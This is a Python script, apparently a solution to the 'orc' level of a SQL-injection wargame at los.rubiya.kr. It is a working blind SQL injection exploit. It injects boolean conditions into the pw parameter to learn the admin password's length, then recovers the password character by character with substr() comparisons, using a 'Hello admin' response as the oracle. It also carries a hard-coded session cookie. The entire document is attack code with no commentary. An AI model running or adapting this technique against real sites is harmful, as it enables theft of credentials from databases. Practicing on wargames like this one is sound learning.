from pwn import *
import requests

flag = ''

length = 0

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
session = dict(PHPSESSID="g9e21ei06cdrb6n0g88n4qe24b")

log.info("Start")
log.info("Find length of the password")

for i in range(0, 20):
	try:
		query = url + "1' or id='admin' and length(pw)=" + str(i) + "%23"
		r = requests.post(query, cookies=session)
	except:
		log.failure("Error Occured")
		continue

	if 'Hello admin' in r.text:
		length = i
		break
log.success("Found length : %d"%(length))

log.info("Find password")

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' or id='admin' and substr(pw," + str(j) + ",1)='" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			log.failure("Error Occured")
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			log.success("Found %s : %s"%(str(j),flag))
			break
log.info("Found password : %s"%(flag))
log.info("End")	